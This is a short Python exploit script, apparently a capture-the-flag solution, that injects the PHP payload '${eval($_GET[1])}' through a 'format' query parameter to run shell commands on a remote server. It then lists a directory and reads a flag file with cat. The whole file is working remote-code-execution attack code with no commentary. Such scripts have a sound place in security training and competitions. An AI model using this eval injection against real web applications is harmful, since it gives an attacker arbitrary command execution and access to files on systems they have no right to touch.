import requests
import re

#TARGET_URL='http://localhost:1337'
TARGET_URL='http://159.65.54.14:32634'

def runCommand(command):
    format="${eval($_GET[1])}"
    res=requests.get(TARGET_URL+'/?format='+format+'&1='+command+';')
    index_to_cut=re.search("(?s:.*)(?P<res_body><html>(?s:.*)</html>)", res.text).span(1)[0]
    body=res.text[0:index_to_cut]
    return body

def findFlagFile():
    res=runCommand("system('ls ../')")
    file=re.search("(?P<flagFile>flag[a-zA-Z0-9]{5})",res).group()
    return file

def getFlag():
    file=findFlagFile()
    res=runCommand("system('cat ../{file}')".format(file=file))
    print(res)

getFlag()